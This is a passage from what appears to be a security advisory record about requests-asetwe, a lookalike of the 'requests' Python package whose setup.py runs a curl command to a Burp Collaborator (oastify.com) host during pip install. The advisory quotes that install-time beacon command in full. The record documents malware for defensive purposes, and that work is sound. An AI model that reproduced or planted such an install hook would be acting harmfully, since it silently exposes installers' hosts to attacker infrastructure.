  "summary": "requests-asetwe: install-time beacon to Burp Collaborator host from setup.py",
  "details": "setup.py of requests-asetwe unconditionally executes `os.system('curl -s https://w5223hr2yr968bhwql8bv5n8ozuqih66.oastify.com')` during `pip install`. The destination is a Burp Collaborator (oastify.com) subdomain — an out-of-band interaction service used to confirm code execution and collect the victim's IP/DNS metadata on the attacker's collaborator instance. The package name is a lookalike of the widely-used `requests` package, and the shipped setup.py has no legitimate reason to contact an anonymous oastify subdomain at install time. Installing the package causes the installer's host to beacon to attacker-controlled infrastructure automatically.",
